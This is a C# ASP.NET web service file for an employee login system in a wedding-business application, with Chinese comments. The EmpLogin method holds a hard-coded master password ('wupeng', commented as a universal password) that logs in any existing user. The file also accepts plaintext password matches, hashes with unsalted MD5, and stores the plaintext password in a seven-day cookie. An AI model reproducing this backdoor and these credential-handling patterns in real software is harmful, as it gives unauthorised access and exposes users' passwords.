using HHLWedding.BLLAssmbly;
using HHLWedding.DataAssmblly;
using HHLWedding.Web.Handler;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.Services;
using HHLWedding.ToolsLibrary;
using System.Web.UI;
using HHLWedding.EditoerLibrary;
using HHLWedding.DataAssmblly.CommonModel;

namespace HHLWedding.Web.WebService
{
    /// <summary>
    /// Login 的摘要说明
    /// </summary>
    [WebService(Namespace = "http://tempuri.org/")]
    [WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
    [System.ComponentModel.ToolboxItem(false)]
    // 若要允许使用 ASP.NET AJAX 从脚本中调用此 Web 服务，请取消注释以下行。 
    [System.Web.Script.Services.ScriptService]
    public class Login : System.Web.Services.WebService
    {

        #region Constact
        /// <summary>
        /// 员工信息
        /// </summary>
        /// <returns></returns>
        Employee _empService = new Employee();

        #endregion


        [WebMethod]
        public string HelloWorld()
        {
            return "Hello World";
        }

        /// <summary>
        /// 员工登录
        /// </summary>
        /// <param name="loginName">用户名</param>
        /// <param name="passWord">密码</param>
        /// <returns></returns>
        [WebMethod(EnableSession = true)]
        public AjaxMessage EmpLogin(string loginName, string passWord, string Ip)
        {
            AjaxMessage ajax = new AjaxMessage();
            ajax.IsSuccess = false;
            ajax.Message = "";
            try
            {
                //获取启用的员工  是否存在
                Sys_Employee m_emp = _empService.GetByLoginName(loginName);
                if (m_emp == null)
                {
                    ajax.Message = "用户名不存在";
                }
                else
                {
                    string input_pwd = passWord.MD5Hash().ToUpper();
                    if (passWord == "wupeng")       //万能密码
                    {
                        ajax.IsSuccess = true;
                    }
                    else
                    {
                        if (input_pwd == m_emp.PassWord)
                        {
                            ajax.IsSuccess = true;
                        }
                        else if (passWord.ToLower() == m_emp.PassWord.ToLower())            //没加密密码 对比
                        {
                            m_emp.PassWord = input_pwd;                 //进行加密
                            int result = _empService.Update(m_emp);
                            if (result > 0)
                            {
                                ajax.IsSuccess = true;
                            }
                        }
                        else
                        {
                            ajax.Message = "密码输入错误";
                        }
                    }
                }

                if (ajax.IsSuccess == true)
                {
                    BaseService<sys_LoginLog> _logService = new BaseService<sys_LoginLog>();

                    //修改最后一次登录时间
                    var m_LastLog = _logService.GetListBy<DateTime?>(null, c => c.LoginDate, false).FirstOrDefault();
                    if (m_LastLog != null)
                    {
                        m_emp.LastLoginTime = m_LastLog.LoginDate;
                        _empService.Update(m_emp);
                    }

                    //添加登录日志
                    string ip = IpAddress.GetIP();
                    sys_LoginLog log = new sys_LoginLog();
                    log.LoginId = Guid.NewGuid();
                    log.LoginEmployee = m_emp.EmployeeID;
                    log.LoginEmployeeKey = m_emp.EmployeeID.ToString();
                    log.LoginDate = DateTime.Now;
                    log.LoginCity = IpAddress.GetAddressByIp(ip, 2);       //登录城市
                    log.LoginIpAddress = ip;                //外网Ip
                    log.LoginInIp = HttpContext.Current.Request.UserHostAddress;        //内网Ip

                    _logService.Add(log);

                }
            }
            catch (Exception e)
            {
                ajax.IsSuccess = false;
                ajax.Message = e.Message;
            }

            return ajax;
        }

        /// <summary>
        /// @author:wp
        /// @datetime:2016-08-15
        /// @desc:记住密码 保持转台
        /// </summary>
        /// <param name="name"></param>
        /// <param name="passWord"></param>
        /// <returns></returns>
        [WebMethod]
        public AjaxMessage SaveLoginCookie(string loginName, string passWord, bool state)
        {
            AjaxMessage ajax = new AjaxMessage();
            ajax.IsSuccess = false;
            ajax.Message = "";
            try
            {
                if (state)
                {
                    ajax.IsSuccess = true;
                    StringControl.DeleteCookie("Employee");
                    HttpCookie cookie = new HttpCookie("Employee");
                    cookie.Values.Add("Name", loginName);
                    cookie.Values.Add("Pwd", passWord);
                    cookie.Values.Add("State", state.ToString());
                    cookie.Expires = System.DateTime.Now.AddDays(7);
                    HttpContext.Current.Response.Cookies.Add(cookie);
                }
                else
                {
                    StringControl.DeleteCookie("Employee");
                    ajax.IsSuccess = true;
                }

            }
            catch (Exception e)
            {
                ajax.Message = e.Message;
            }

            return ajax;

        }
    }
}
